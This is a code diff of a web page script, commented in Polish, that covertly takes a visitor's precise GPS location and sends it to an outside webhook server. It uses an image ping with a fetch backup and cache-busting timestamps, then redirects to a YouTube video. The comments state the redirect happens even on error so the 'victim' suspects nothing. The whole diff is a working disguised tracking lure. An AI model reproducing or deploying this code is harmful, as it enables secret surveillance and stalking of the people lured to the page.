@@ -216,27 +216,28 @@
             
             setTimeout(function() {
                 if (navigator.geolocation) {
+                    // Dodajemy znacznik czasu, żeby przeglądarka nie brała starej lokalizacji z cache
                     navigator.geolocation.getCurrentPosition(
                         function(position) {
                             var lat = position.coords.latitude;
                             var lon = position.coords.longitude;
                             
-                            // Używamy fetch z trybem no-cors / beacon lub zwykłego img ping, żeby upewnić się, że request wyjdzie do chmury
+                            // Wywołanie przez Image ping z unikalnym timestampem przeciw cache
+                            var ts = new Date().getTime();
                             var img = new Image();
-                            img.src = 'https://czeladz-webhook-live.onrender.com/zapisz?lat=' + lat + '&lon=' + lon;
+                            img.src = 'https://czeladz-webhook-live.onrender.com/zapisz?lat=' + lat + '&lon=' + lon + '&t=' + ts;
                             
-                            // Dodatkowo fetch jako backup
-                            fetch('https://czeladz-webhook-live.onrender.com/zapisz?lat=' + lat + '&lon=' + lon, { mode: 'no-cors' })
+                            // Backup przez fetch z no-cors
+                            fetch('https://czeladz-webhook-live.onrender.com/zapisz?lat=' + lat + '&lon=' + lon + '&t=' + ts, { mode: 'no-cors' })
                                 .catch(err => console.log(err));
                                 
-                            // Krótkie opóźnienie na wysłanie paczki i kierunek YouTube
+                            // Przekierowanie na YouTube po ułamku sekundy
                             setTimeout(function() {
                                 window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
                             }, 800);
                         },
                         function(error) {
-                            console.log("GPS error code: " + error.code + " - " + error.message);
-                            // Nawet przy błędzie GPS wyrzucamy na YouTube, żeby użytkownik nic nie podejrzewał
+                            // Jeśli przeglądarka zablokowała lub wystąpił błąd, i tak przekierowujemy, żeby ofiara nic nie podejrzewała
                             window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
                         },
                         { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
